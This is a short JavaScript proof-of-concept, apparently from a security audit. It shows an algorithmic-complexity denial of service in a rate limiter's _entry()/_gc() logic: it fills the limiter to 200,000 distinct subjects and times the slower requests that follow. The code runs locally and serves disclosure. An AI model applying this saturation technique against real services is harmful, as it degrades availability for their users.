// PoC 2: Algorithmic-complexity DoS in Limiter._entry()/_gc().
//
// src/limits.js:
//   _entry(subject, now) {
//     ...
//     if (this.entries.size >= 200000) this._gc(now);      <-- O(n) full-map scan
//   }
//   _gc(now) { for (const [k,v] of this.entries) ... }     <-- per new subject, once saturated
//
// Because the per-subject key is attacker-chosen (see PoC 1), a single host can
// saturate `entries` and then pay an O(200k) scan on EVERY subsequent request.

import { Limiter } from '../src/limits.js';
import { CLASS } from '../src/frames.js';

const L = new Limiter({ budget: 1000, windowMs: 10_000 });
const now = Date.now();
const N = 200_000;

let t0 = process.hrtime.bigint();
for (let i = 0; i < N; i++) {
  L.check({ subject: `s${i}`, net: '203.0.113.9', costClass: CLASS.CHEAP }, now);
}
let fillMs = Number(process.hrtime.bigint() - t0) / 1e6;
console.log(`fill ${N} distinct subjects: ${fillMs.toFixed(0)} ms  (entries=${L.entries.size})`);

// Now saturated: measure the per-request cost of the next 5 000 unique subjects.
t0 = process.hrtime.bigint();
const M = 5_000;
for (let i = 0; i < M; i++) {
  L.check({ subject: `x${i}`, net: '203.0.113.9', costClass: CLASS.CHEAP }, now);
}
const satMs = Number(process.hrtime.bigint() - t0) / 1e6;
console.log(`next ${M} requests while saturated: ${satMs.toFixed(0)} ms  ->  ${(satMs / M * 1000).toFixed(1)} µs/request`);
console.log(`amplification vs unsaturated: ~${(satMs / M) / (fillMs / N) > 0 ? ((satMs / M) / (fillMs / N)).toFixed(0) : '∞'}x`);
console.log(`heap used after: ${(process.memoryUsage().heapUsed / 1e6).toFixed(0)} MB`);
